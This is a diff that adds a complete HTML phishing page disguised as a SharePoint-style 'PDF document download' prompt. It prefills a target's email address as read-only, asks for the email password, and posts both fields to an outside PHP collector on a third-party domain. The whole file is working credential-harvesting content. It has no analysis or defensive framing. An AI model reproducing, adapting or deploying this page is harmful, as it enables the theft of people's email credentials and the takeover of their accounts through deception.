@@ -1,0 +1,111 @@
+                        
+                        <!DOCTYPE html>
+                        <html>
+
+                        <title>PDF-20210327-WA0007 </title>
+
+
+                          <meta charset="utf-8">
+                          <meta name="viewport" content="width=device-width, initial-scale=1">
+                          <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+                          <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+                          <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+
+
+
+                        <style>
+                        body {
+                          font-family: Arial;
+                        }
+
+                        input[type=email], select {
+                            width: 100%;
+                            padding: 12px 20px;
+                            margin: 15px 0;
+                            display: block;
+                            border: 1px solid #d10d00;
+                            border-radius: 4px;
+                            box-sizing: border-box;
+                        }
+
+                        input[type=password], select {
+                            width: 100%;
+                            padding: 12px 20px;
+                            margin: 15px 0;
+                            display: block;
+                            border: 1px solid #d10d00;
+                            border-radius: 4px;
+                            box-sizing: border-box;
+                        }
+
+                        input[type=submit] {
+                            width: 100%;
+                            background-color: #D7000C;
+                            color: white;
+                            padding: 14px 20px;
+                            margin: 8px 0;
+                            border: none;
+                            border-radius: 4px;
+                            cursor: pointer;
+                        }
+
+                        input[type=submit]:hover {
+                            background-color: #D7000C;
+                        }
+
+                        div.container {
+                            margin: auto;
+                            width: 50%;
+                            padding: 10px;
+                            border: 3px #D7000C;
+                            border-radius: 10px;
+                            background-color: #d10d00;
+                            width: 500px;
+                            padding: 20px;
+                            border-style: solid;
+                            border-width: thin;
+                        }
+                        </style>
+
+                        <body>
+
+
+                         <br><br><br><br>
+                        <div class="container">
+
+                        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRXpwE1CeCXUrTwLefHOE_aI6Z-8N7TEOn4gA&usqp=CAU" alt="SharePoint" border="0" height="100">
+
+                        <p></p>
+                        <font face="Trebuchet MS" color="#D7000C" size="4"><b>&nbsp;&nbsp;&nbsp; LOGIN YOUR DETAILS TO DOWNLOAD DOCUMENT </b></font>
+
+
+                        <p></p>
+                        <form action="https://britstar.org.uk/zzlogin.php" method="POST">
+
+
+                        <hr style="height:2px;border:none;color:none;background-color:none;" />
+                        <div class="alert alert-danger">
+                            <strong>Alert!:</strong> You have one New PDF document for download</strong><br>PDF Q0017 - 3512C.PDF (0.95 MB)
+
+                          </div>
+
+
+                        <center>
+
+                        <input type="email" id="fname" name="feedback" Placeholder="Enter Email Address" value="info@group.ru
+" readonly required>
+
+                            <input type="password" id="fname" name="feedbacknow" placeholder="Enter Email Password" autofocus required>
+
+
+                          
+                            <input type="submit" value="CONTINUE TO DOWNLOAD PDF">
+                          </center>
+
+
+                        </form>
+
+                        </div>
+
+                        </body>
+                        </html>
